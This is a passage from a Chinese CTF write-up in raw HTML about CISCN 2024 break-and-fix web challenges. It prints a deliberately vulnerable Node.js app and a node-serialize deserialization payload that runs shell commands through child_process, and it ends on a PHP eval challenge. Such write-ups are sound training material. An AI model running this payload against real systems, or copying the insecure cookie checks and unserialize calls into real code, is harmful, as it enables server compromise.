function">get</span><span class="token punctuation">(</span><span class="token string">'/qq'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> data_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>package.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"app"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"art-template"</span><span class="token operator">:</span> <span class="token string">"^4.13.2"</span><span class="token punctuation">,</span>    <span class="token property">"body-parser"</span><span class="token operator">:</span> <span class="token string">"^1.19.0"</span><span class="token punctuation">,</span>    <span class="token property">"chrome"</span><span class="token operator">:</span> <span class="token string">"0.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.5"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-art-template"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-jwt"</span><span class="token operator">:</span> <span class="token string">"^5.3.0"</span><span class="token punctuation">,</span>    <span class="token property">"jsonwebtoken"</span><span class="token operator">:</span> <span class="token string">"^7.4.3"</span><span class="token punctuation">,</span>    <span class="token property">"node-schedule"</span><span class="token operator">:</span> <span class="token string">"^2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"node-serialize"</span><span class="token operator">:</span> <span class="token string">"0.0.4"</span><span class="token punctuation">,</span>    <span class="token property">"serialize"</span><span class="token operator">:</span> <span class="token string">"^0.1.3"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"^0.11.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计代码，发现可以直接在&#x2F;login路由传cookie参数profile打serialize依赖的反序列化</p><p>直接打payload，因为不回显，所以尝试写文件带外</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token string-property property">"function"</span><span class="token operator">:</span><span class="token string">"_$$ND_FUNC$$_function()&#123;\r\n\t\trequire('child_process').exec('ls />/tmp/1.txt', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;()"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623125255162.png" alt="image-20240623125255162"></p><p>然后去前面任意文件读取那边读取&#x2F;tmp&#x2F;1.txt即可</p><h2 id="FIX（Failed）"><a href="#FIX（Failed）" class="headerlink" title="FIX（Failed）"></a>FIX（Failed）</h2><p>有好几个洞，猜测是差一个xss的洞，一直不会修</p><p>据说xss是22年的黑盾杯的方法：<a href="https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg">https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg</a></p><p>复现xss参考：<a href="https://blog.mo60.cn/index.php/archives/487.html">https://blog.mo60.cn/index.php/archives/487.html</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> serialize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> schedule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-schedule'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Change working directory to /srv</span>process<span class="token punctuation">.</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'/srv'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> rule1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">schedule<span class="token punctuation">.</span>RecurrenceRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>rule1<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span> <span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 定时清除</span><span class="token keyword">let</span> job1 <span class="token operator">=</span> schedule<span class="token punctuation">.</span><span class="token function">scheduleJob</span><span class="token punctuation">(</span>rule1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token string">"#获取的数据信息\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"wriet error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-art-template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_path <span class="token operator">=</span> <span class="token string">"data.html"</span><span class="token punctuation">;</span><span class="token comment">// Middleware to set default cookies for /admin route</span><span class="token keyword">function</span> <span class="token function">setDefaultAdminCookies</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'normal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'is_admin'</span><span class="token punctuation">,</span> <span class="token string">'false'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//主页</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>bd<span class="token operator">=</span><span class="token function">str</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bd<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\'|http|\"|\`|cookie|&lt;|>|script</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fs<span class="token punctuation">.</span><span class="token function">appendFile</span><span class="token punctuation">(</span><span class="token string">'data.html'</span><span class="token punctuation">,</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后台管理</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">datadir</span> <span class="token operator">:</span> data_path        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> setDefaultAdminCookies<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>qweqwe<span class="token operator">=</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>newname<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>qweqwe<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>qweqwe<span class="token operator">=</span>qweqwe<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>data_path <span class="token operator">=</span> qweqwe<span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//已弃用的登录</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/login.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>profile<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(funcion|require|exec|child_process)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> obj <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public/data'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//QQ</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/qq'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">!==</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>is_admin <span class="token operator">===</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> data_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ezwp"><a href="#ezwp" class="headerlink" title="ezwp"></a>ezwp</h1><h2 id="BREAK（非预期）"><a href="#BREAK（非预期）" class="headerlink" title="BREAK（非预期）"></a>BREAK（非预期）</h2><p>webpwn题</p><p>给了个myphp.so和index.php以及dockerfile</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,A-Z,0-9&lt;>\?]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span 